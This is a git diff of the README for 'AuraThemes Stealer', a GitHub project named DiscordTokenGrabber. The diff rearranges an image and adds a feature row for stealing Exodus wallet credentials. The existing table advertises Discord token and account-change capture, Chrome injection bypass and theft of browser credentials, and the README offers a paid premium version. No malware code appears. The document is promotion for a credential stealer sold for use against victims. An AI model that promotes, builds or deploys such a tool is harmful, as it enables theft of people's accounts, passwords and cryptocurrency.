@@ -1,14 +1,13 @@
+<p align="center">
+    <img src="./assets/avatar.png" width=100  >
+</p>
+
 <div align="center">
 <a href="https://github.com/k4itrun/DiscordTokenGrabber/issues"><img src="https://img.shields.io/github/issues/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Issues"></a>
 <a href="https://github.com/k4itrun/DiscordTokenGrabber/blob/main/LICENSE"><img src="https://img.shields.io/github/license/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="MIT License"></a>
 <a href="https://github.com/k4itrun/DiscordTokenGrabber/stargazers"><img src="https://img.shields.io/github/stars/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Stargazers"></a>
 <a href="https://github.com/k4itrun/DiscordTokenGrabber/network/members"><img src="https://img.shields.io/github/forks/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Forks"></a>
 </div>
-<br>
-
-<p align="center">
-    <img src="./assets/avatar.png" width=100  >
-</p>
 
 <h1 align="center">AuraThemes Stealer</h1>
 
@@ -93,6 +92,7 @@ node index.js
 | `Chrome Injection`                | Chrome Injection Bypass          | 💜        |
 | `Discord Injection`                | Alert for each action (login, change username/email/password/codes)          | 💜        |
 | `Browsers ALL`                |  Steal Browsers Credentials          | 💜        |
+| `Exodus Stealer ALL`                |  Steal Exodus Credentials          | 💜        |
 
 - If you want information about the premium version, contact me. 
 
